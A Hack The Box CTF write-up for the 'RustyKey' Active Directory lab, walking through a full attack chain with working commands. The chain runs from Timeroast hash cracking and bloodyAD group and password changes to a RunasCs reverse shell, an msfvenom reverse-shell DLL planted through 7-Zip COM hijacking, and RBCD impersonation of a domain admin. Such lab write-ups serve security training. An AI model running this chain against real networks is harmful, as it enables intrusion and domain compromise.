---
layout: post
title: "Hack The Box Rustykey Write-up"
category: CTF
tags: hackthebox windows active-directory kerberos timeroast com-hijacking privilege-escalation bloodhound rbcd 
---

# RustyKey - HackTheBox Writeup

## Machine Information
- **Name**: RustyKey  
- **Difficulty**: Hard
- **OS**: Windows (Active Directory)
- **IP**: 10.10.11.75
- **Domain**: rustykey.htb

## Summary
RustyKey is a Hard-difficulty Windows Active Directory machine that focuses on Kerberos-only authentication, Timeroast attacks, and COM hijacking for privilege escalation. The attack path involves exploiting machine account credentials, manipulating Active Directory group memberships, and leveraging COM object hijacking to achieve SYSTEM privileges.

## Initial Access

### Credentials Discovery
Initial credentials were provided:
- **Username**: rr.parker
- **Password**: 8#t5HE8L!W3A*

### Kerberos Configuration
Since NTLM is disabled, all authentication must be done via Kerberos. First, generate the proper krb5.conf:

```bash
nxc smb $TARGET --generate-krb5-file ./krb5.conf
```

Configure `/etc/krb5.conf`:
```ini
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = yes
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
    RUSTYKEY.HTB = {
        kdc = 10.10.11.75
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
```

### Getting TGT and Domain Enumeration
```bash
# Request TGT for rr.parker
getTGT.py rustykey.htb/rr.parker:8#t5HE8L!W3A*
export KRB5CCNAME=rr.parker.ccache

# Enumerate domain users
nxc smb $TARGET -u $USER -p $PASSWORD -k --users
```

**Domain Users Discovered:**
- Administrator (Built-in admin)
- Guest (Built-in guest)
- krbtgt (KDC service account)
- rr.parker
- mm.turner
- bb.morgan
- gg.anderson
- dd.ali
- ee.reed
- nn.marcos
- backupadmin

### BloodHound Analysis
```bash
bloodhound-python -u rr.parker -p '8#t5HE8L!W3A*' -d 'rustykey.htb' -dc 'dc.rustykey.htb' -ns '10.10.11.75' --zip -c all -k -no-pass --auth-method kerberos
```

**Key BloodHound Findings:**
- **backupadmin**: Member of Enterprise Admins, has DCSync rights
- **nn.marcos**: Member of HelpDesk group (can change passwords for bb.morgan, has GenericWrite on dd.ali, can add members to Protected Objects group)
- **mm.turner**: Member of DELEGATIONMANAGER group (can modify msDS-AllowedToActOnBehalfOfOtherIdentity on DC)
- **bb.morgan, gg.anderson**: Members of IT group (can PSRemote to DC)
- **ee.reed**: Member of Support group (can PSRemote to DC)

## Exploitation Phase

### Timeroast Attack
Due to multiple computer objects in the domain, a Timeroast attack was conducted:

```bash
nxc smb $TARGET -M timeroast
```

This yielded multiple SNTP-MS hashes. Using the custom timecrack.py script (after fixing encoding issues):

```bash
python3 timecrack.py rustykey.hashes.timeroast /opt/rockyou.txt
```

**Result**: Successfully cracked RID 1125 with password `Rusty88!`

Analysis on bloodhound revealed RID 1125 corresponds to the machine account **IT-COMPUTER3$**.

### Privilege Escalation Path 1: Password Changes via HelpDesk

With IT-COMPUTER3$ credentials, the attack path becomes:

1. **Add IT-COMPUTER3$ to HelpDesk group**:
```bash
getTGT.py -dc-ip 10.10.11.75 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
export KRB5CCNAME=IT-COMPUTER3$.ccache
bloodyAD --host dc.rustykey.htb --dc-ip 10.10.11.75 -d rustykey.htb -k add groupMember 'HELPDESK' IT-COMPUTER3$
```

2. **Remove IT group from Protected Objects** (to enable password changes):
```bash
bloodyAD --host dc.rustykey.htb -k -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'
```

3. **Change bb.morgan's password**:
```bash
bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Password123.'
```

### Initial Shell Access

```bash
getTGT.py -dc-ip 10.10.11.75 'rustykey.htb/bb.morgan:Password123.'
export KRB5CCNAME=bb.morgan.ccache
evil-winrm -i dc.rustykey.htb -r rustykey.htb -u bb.morgan
```

### User Flag
Located at `C:\Users\bb.morgan\Desktop\user.txt`

The desktop also contained `internal.pdf`, which revealed that the Support Group has temporary extended access to archiving tools and registry keys.

## Privilege Escalation Phase

### Support Group Access

Following the PDF hint about Support Group privileges:

1. **Remove Support group from Protected Objects**:
```bash
bloodyAD --kerberos --dc-ip 10.10.11.75 --host dc.rustykey.htb -d rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' remove groupMember "CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB" "SUPPORT"
```

2. **Change ee.reed's password**:
```bash
bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'Password123.'
```

### Shell as ee.reed

Since evil-winrm didn't work directly with ee.reed, RunasCs.exe was used:

```bash
# From bb.morgan's evil-winrm session
mkdir C:\Tools
cd C:\Tools
upload RunasCs.exe

# Start listener
rlwrap nc -lvnp 4445

# Execute as ee.reed
.\RunasCs.exe ee.reed Password123. cmd.e -r 10.10.14.255:4445
```

### Analyzing the Internal PDF Document

The `internal.pdf` document found on bb.morgan's desktop contained crucial intelligence about extended privileges:

```text
Subject: Support Group - Archiving Tool Access
Date: Mon, 10 Mar 2025 14:35:18 +0100
Hey team,
As part of the new Support utilities rollout, extended access has been temporarily granted to allow
testing and troubleshooting of file archiving features across shared workstations.
```

This document revealed two critical pieces of information:
1. **Support Group members** (like ee.reed) have temporary **extended access**
2. The extended access specifically relates to **archiving tool features**

The mention of "extended access" in the context of archiving tools strongly suggested registry-level permissions or the ability to interact with system-level archiving components - a perfect setup for COM hijacking attacks.

### COM Hijacking Enumeration and Attack

With ee.reed's elevated context (Support Group member with archiving tool access), systematic COM enumeration was performed to identify hijacking opportunities.

#### Step 1: Enumerate Installed Archiving Software

First, check what archiving tools are installed on the system:

```cmd
# Check for archiving software in installed programs
wmic product get name | findstr /i "zip\|rar\|archive\|compress"

# Check services related to archiving
sc query state= all | findstr /i "7zip\|compress\|archive"
```

#### Step 2: Search for Archive-Related COM Objects

The registry enumeration revealed the presence of 7-Zip and Windows built-in compression tools:

```cmd
# Search for 7-Zip related CLSIDs
reg query "HKLM\SOFTWARE\Classes\CLSID" /s /f "7-zip" /t REG_SZ

# Results showed:
# HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}
#     (Default)    REG_SZ    7-Zip Shell Extension

# Search for other zip-related CLSIDs
reg query "HKLM\SOFTWARE\Classes\CLSID" /s /f "zip" /t REG_SZ
```

This revealed multiple COM objects related to compression:
- **{23170F69-40C1-278A-1000-000100020000}**: 7-Zip Shell Extension
- **{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}**: Compressed (zipped) Folder SendTo Target
- **{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}**: Compressed (zipped) Folder Context Menu
- **{BD472F60-27FA-11cf-B8B4-444553540000}**: Compressed (zipped) Folder Right Drag Handler

#### Step 3: Analyze Target COM Object

The 7-Zip COM object was selected as the primary target due to its widespread usage:

```cmd
reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"

# Output:
# HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
#     (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
#     ThreadingModel    REG_SZ    Apartment
```

This confirmed:
- The COM object points to `C:\Program Files\7-Zip\7-zip.dll`
- It uses the Apartment threading model
- The registry key is accessible for modification

#### Step 4: Execute COM Hijacking Attack

The connection between the PDF hint and the attack became clear - ee.reed's Support Group membership provided the necessary registry permissions to modify HKLM COM entries.

1. **Create malicious DLL**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.255 LPORT=4445 -f dll -o tshell.dll
```

2. **Upload and position the DLL**:
```bash
# From bb.morgan's evil-winrm session
mkdir C:\test
cd C:\test
upload tshell.dll
```

3. **Hijack the COM object registry entry**:
```cmd
# From ee.reed's shell (Support Group member with registry access)
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\test\tshell.dll" /f

# Output: The operation completed successfully.
```

4. **Verify the hijack**:
```cmd
reg query "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"

# Now shows:
# (Default)    REG_SZ    C:\test\tshell.dll
```

#### Step 5: Trigger COM Object Instantiation

The 7-Zip COM object gets instantiated when:
- Windows Explorer processes archive files
- Applications use 7-Zip programmatically
- System services interact with compressed files
- File association handlers are triggered

Within minutes of the registry modification, the COM object was triggered, resulting in a reverse shell connection:

```bash
[Sep 21, 2025 - 06:42:18 (CEST)] exegol-htb /workspace # rlwrap nc -lvnp 4445
Ncat: Connection from 10.10.11.75.
Microsoft Windows [Version 10.0.17763.7434]
C:\Windows\system32>
```

#### The Perfect Storm: Connecting All Elements

The COM hijacking success was made possible by the convergence of several factors:

1. **PDF Intelligence**: The internal document specifically mentioned Support Group's extended access to archiving tools
2. **Group Membership**: ee.reed's membership in the Support Group provided the necessary registry permissions
3. **COM Enumeration**: Systematic registry analysis identified the 7-Zip COM object as a viable target
4. **Registry Permissions**: The Support Group's "extended access" translated to write permissions on HKLM COM entries
5. **Automatic Trigger**: Windows' frequent interaction with COM objects ensured the payload executed quickly

This attack chain demonstrates how seemingly minor hints in documentation can reveal major attack vectors, and how proper enumeration can turn abstract permissions ("extended access to archiving tools") into concrete privilege escalation paths.

### Resource-Based Constrained Delegation (RBCD)

The final privilege escalation used RBCD through mm.turner's DELEGATIONMANAGER rights:

1. **Configure delegation**:
```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```

2. **Perform S4U2Self impersonation**:
```bash
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
```

3. **Use impersonated ticket**:
```bash
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
psexec.py -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'
```

### Root Flag
Located at `C:\Users\Administrator\Desktop\root.txt`

## Key Learning Points

1. **Kerberos-Only Environment**: Understanding how to operate in environments where NTLM is disabled
2. **Timeroast Attack**: Novel attack technique against NTP authentication in Active Directory
3. **COM Hijacking**: Leveraging registry manipulation to hijack COM objects for privilege escalation  
4. **RBCD Exploitation**: Using constrained delegation to impersonate high-privilege accounts
5. **BloodHound Analysis**: Critical for understanding complex Active Directory attack paths

## Tools Used
- NetExec (nxc)
- Impacket suite (getTGT.py, wmiexec.py, etc.)
- BloodHound/BloodHound-Python
- BloodyAD
- Evil-WinRM
- RunasCs.exe
- Custom Timeroast scripts
- Metasploit (msfvenom)


